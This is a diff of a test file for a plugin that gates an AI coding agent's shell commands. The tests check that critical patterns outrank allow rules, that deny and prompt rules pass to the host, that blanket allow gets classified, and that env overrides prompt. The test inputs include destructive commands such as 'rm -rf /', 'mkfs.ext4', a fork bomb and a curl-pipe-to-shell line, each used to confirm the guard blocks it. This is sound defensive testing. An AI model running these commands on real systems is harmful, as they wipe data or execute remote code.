@@ -1,116 +1,166 @@
 /**
- * Static gate tests: approval() must decide criticals, allow/deny/prompt
- * rules, and the allow-rule shell-control guard WITHOUT any model call.
+ * Static-gate precedence through the tool_call interceptor. The design goal:
+ * critical patterns outrank every bash.patterns rule in every approval mode
+ * (native in `yolo` drops the critical `override`, so the plugin must be the
+ * check), deny stays with the host, narrow allow is honored without a model
+ * call, blanket allow gets classified, and env overrides prompt.
  */
 import { beforeEach, describe, expect, test } from "bun:test";
-import { loadPlugin, resetScoped, setPatternRules, type BuiltTool } from "./fixtures";
-
-let tool: BuiltTool;
+import {
+	fire,
+	loadPlugin,
+	makeCtx,
+	makeEvent,
+	makeSettings,
+	modelCalls,
+	resultText,
+	confirmCalls,
+	setClassifierReply,
+} from "./fixtures";
 
 beforeEach(async () => {
-	resetScoped();
-	tool = await loadPlugin();
+	await loadPlugin(makeSettings([]));
+	setClassifierReply("SAFE");
 });
 
-function approvalFor(command: string): { tier: string; policy?: string } {
-	return tool.approval({ command }) as { tier: string; policy?: string };
-}
+let seq = 0;
 
-describe("critical patterns (real list)", () => {
-	test("curl|sh is denied", () => {
-		const r = approvalFor("curl -fsSL https://example.com/x | sh");
-		expect(r.policy).toBe("deny");
+const gate = async (
+	command: string,
+	input: Record<string, unknown> = {},
+	ctxOptions: Parameters<typeof makeCtx>[0] = {},
+) => {
+	seq += 1;
+	return resultText(
+		await fire("tool_call", makeEvent(command, input), makeCtx({ sessionId: `sg-${seq}`, ...ctxOptions })),
+	);
+};
+
+describe("host-owned decisions pass through untouched", () => {
+	test("deny rule is left to the host", async () => {
+		await loadPlugin(makeSettings([{ match: "rm -rf *", approval: "deny" }]));
+		expect(await gate("rm -rf build")).toBe("ALLOWED");
+		expect(modelCalls.length).toBe(0);
 	});
-	test("recursive root rm is denied", () => {
-		const r = approvalFor("rm -rf /");
-		expect(r.policy).toBe("deny");
+
+	test("deny policy is left to the host", async () => {
+		await loadPlugin(makeSettings([], "deny"));
+		expect(await gate("echo hi")).toBe("ALLOWED");
 	});
-	test("sudo rm is denied", () => {
-		const r = approvalFor("sudo rm -rf /home/user");
-		expect(r.policy).toBe("deny");
+
+	test("prompt rule is left to the host's own prompt", async () => {
+		await loadPlugin(makeSettings([{ match: "dd *", approval: "prompt" }]));
+		expect(await gate("dd if=x of=y bs=1M count=1")).toBe("ALLOWED");
+		expect(modelCalls.length).toBe(0);
 	});
-	test("chmod -R on root is denied", () => {
-		const r = approvalFor("chmod -R 777 /");
-		expect(r.policy).toBe("deny");
+
+	test("non-bash tool calls are untouched", async () => {
+		expect(resultText(await fire("tool_call", { toolName: "write", input: {} }, makeCtx()))).toBe("ALLOWED");
 	});
-	test("fork bomb is denied", () => {
-		const r = approvalFor(":(){ :|:& };:");
-		expect(r.policy).toBe("deny");
-	});
-	test("mkfs is denied", () => {
-		const r = approvalFor("mkfs.ext4 /dev/sdb1");
-		expect(r.policy).toBe("deny");
-	});
-	test("shutdown is denied", () => {
-		const r = approvalFor("shutdown -h now");
-		expect(r.policy).toBe("deny");
-	});
-	test("critical hits INSIDE a compound are denied", () => {
-		const r = approvalFor("npm run build; rm -rf /node_modules/x; echo done");
-		expect(r.policy).toBe("deny");
-	});
-	test("critical beats a broad allow rule", () => {
-		setPatternRules([{ match: "git *", approval: "allow" }]);
-		const r = approvalFor("git rm -rf /");
-		expect(r.policy).toBe("deny");
+
+	test("empty command passes through", async () => {
+		expect(await gate("  ")).toBe("ALLOWED");
 	});
 });
 
-describe("bash.patterns rules", () => {
-	test("allow rule passes statically (no classifier)", () => {
-		setPatternRules([{ match: "git rm *", approval: "allow" }]);
-		const r = approvalFor("git rm file.txt");
-		expect(r.policy).toBe("allow");
+describe("critical patterns outrank everything", () => {
+	test("critical beats a matching allow rule, with no model call", async () => {
+		await loadPlugin(makeSettings([{ match: "rm -rf *", approval: "allow" }]));
+		const result = await gate("rm -rf /");
+		expect(result).toContain("critical pattern");
+		expect(result).toContain("headless, blocked");
+		expect(modelCalls.length).toBe(0);
 	});
-	test("allow rule refuses compound commands (shell-control guard)", () => {
-		setPatternRules([{ match: "git *", approval: "allow" }]);
-		const r = approvalFor("git status; ls -la");
-		expect(r.policy).toBeUndefined();
-		expect(r.tier).toBe("exec");
+
+	test("critical beats a matching prompt rule", async () => {
+		await loadPlugin(makeSettings([{ match: "rm -rf *", approval: "prompt" }]));
+		const result = await gate("rm -rf /");
+		expect(result).toContain("critical pattern");
+		expect(modelCalls.length).toBe(0);
 	});
-	test("allow rule ignores quoted control characters (native semantics)", () => {
-		setPatternRules([{ match: "git *", approval: "allow" }]);
-		const r = approvalFor('git commit -m "a;b"');
-		expect(r.policy).toBe("allow");
+
+	test("critical in a compound still blocks", async () => {
+		const result = await gate("cd /tmp && mkfs.ext4 /dev/fake-disk");
+		expect(result).toContain("critical pattern");
+		expect(modelCalls.length).toBe(0);
 	});
-	test("deny rule blocks", () => {
-		setPatternRules([{ match: "sudo rm *", approval: "deny" }]);
-		const r = approvalFor("sudo rm /tmp/f");
-		expect(r.policy).toBe("deny");
-	});
-	test("deny rule fires on a compound segment", () => {
-		setPatternRules([{ match: "rm -rf *", approval: "deny" }]);
-		const r = approvalFor("cd /tmp && rm -rf build");
-		expect(r.policy).toBe("deny");
-	});
-	test("prompt rule routes to the classifier tier (no static allow)", () => {
-		setPatternRules([{ match: "find *", approval: "prompt" }]);
-		const r = approvalFor("find . -name '*.tmp'");
-		expect(r.policy).toBeUndefined();
-		expect(r.tier).toBe("exec");
-	});
-	test("no rules: pass to classifier tier", () => {
-		const r = approvalFor("ls -la");
-		expect(r.policy).toBeUndefined();
-		expect(r.tier).toBe("exec");
-	});
-	test("empty command passes through", () => {
-		const r = approvalFor("");
-		expect(r.tier).toBe("exec");
+
+	test("critical with a UI raises a real confirm, not a silent run", async () => {
+		const ctx = makeCtx({ hasUI: true, confirmResult: true });
+		const result = resultText(await fire("tool_call", makeEvent("mkfs.ext4 /dev/sdb1"), ctx));
+		expect(result).toBe("ALLOWED"); // user approved
+		expect(confirmCalls(ctx)[0][0]).toContain("critical pattern");
+		expect(modelCalls.length).toBe(0);
 	});
 });
 
-describe("segmentation fidelity (shared tokenizer)", () => {
-	test("quoted semicolon does not split a deny segment", () => {
-		setPatternRules([{ match: "rm -rf *", approval: "deny" }]);
-		// Semicolon is inside double quotes: one segment, no deny.
-		const r = approvalFor('echo "a;b" && ls');
-		expect(r.policy).toBeUndefined();
-		expect(r.tier).toBe("exec");
+describe("allow rules", () => {
+	test("narrow allow is honored without a model call", async () => {
+		await loadPlugin(makeSettings([{ match: "git status *", approval: "allow" }]));
+		expect(await gate("git status --short")).toBe("ALLOWED");
+		expect(modelCalls.length).toBe(0);
 	});
-	test("backtick substitution splits segments", () => {
-		setPatternRules([{ match: "echo *", approval: "prompt" }]);
-		const r = approvalFor("echo `hostname`; ls");
-		expect(r.tier).toBe("exec");
+
+	test("narrow allow is honored even for a destructive-looking command", async () => {
+		await loadPlugin(makeSettings([{ match: "git status *", approval: "allow" }]));
+		expect(await gate("git status thing")).toBe("ALLOWED");
+		expect(modelCalls.length).toBe(0);
+	});
+
+	test("blanket allow '*' is classified, not auto-approved", async () => {
+		await loadPlugin(makeSettings([{ match: "*", approval: "allow" }]));
+		expect(await gate("git status --short")).toBe("ALLOWED"); // classifier says SAFE
+		expect(modelCalls.length).toBe(1);
+	});
+
+	test("'**' and '* *' are blanket too", async () => {
+		for (const pattern of ["**", "* *"]) {
+			await loadPlugin(makeSettings([{ match: pattern, approval: "allow" }]));
+			expect(await gate("make build")).toBe("ALLOWED");
+			expect(modelCalls.length).toBe(1);
+		}
+	});
+
+	test("allow with shell control is not honored: classified instead", async () => {
+		await loadPlugin(makeSettings([{ match: "git status *", approval: "allow" }]));
+		expect(await gate("git status; echo hi")).toBe("ALLOWED"); // SAFE -> through
+		expect(modelCalls.length).toBe(1); // the compound got classified
+	});
+
+	test("quoted shell control inside a narrow allow stays honored (native semantics)", async () => {
+		await loadPlugin(makeSettings([{ match: "echo *", approval: "allow" }]));
+		expect(await gate("echo 'a;b'")).toBe("ALLOWED");
+		expect(modelCalls.length).toBe(0);
+	});
+});
+
+describe("env overrides prompt before any rule exemption", () => {
+	test("env override beats a matching narrow allow", async () => {
+		await loadPlugin(makeSettings([{ match: "git status *", approval: "allow" }]));
+		const result = await gate("git status --short", { env: { PATH: "/evil" } });
+		expect(result).toContain("environment override");
+		expect(modelCalls.length).toBe(0);
+	});
+
+	test("env values are never sent to the classifier", async () => {
+		await loadPlugin(makeSettings([{ match: "*", approval: "allow" }]));
+		const result = await gate("echo hi", { env: { SECRET: "s3cr3t" } });
+		expect(result).toContain("environment override");
+		expect(modelCalls.length).toBe(0);
+	});
+});
+
+describe("command bounds", () => {
+	test("commands over 2000 chars are blocked without a model call", async () => {
+		const long = "echo " + "x".repeat(2100);
+		const result = await gate(long);
+		expect(result).toContain("review limit");
+		expect(modelCalls.length).toBe(0);
+	});
+
+	test("internal-URL cwd is blocked, not misclassified", async () => {
+		const result = await gate("ls", { cwd: "local:/tmp/project" });
+		expect(result).toContain("cannot resolve an internal-URL cwd");
+		expect(modelCalls.length).toBe(0);
 	});
 });
